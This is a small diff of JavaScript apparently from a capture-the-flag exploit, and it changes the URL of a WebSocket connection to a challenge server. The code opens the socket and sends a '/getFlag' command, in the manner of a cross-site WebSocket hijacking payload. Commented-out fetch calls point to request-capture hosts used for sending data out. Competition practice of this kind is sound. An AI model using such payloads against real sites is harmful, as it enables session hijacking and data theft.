@@ -12,7 +12,7 @@
     // fetch('http://server.dottak.me')
     // fetch('https://iwacdvb.request.dreamhack.games')
 
-    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com:5003/');
+    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
     ws.onopen = function () {
       setTimeout(() => {
         ws.send(JSON.stringify({ message: '/getFlag' }));
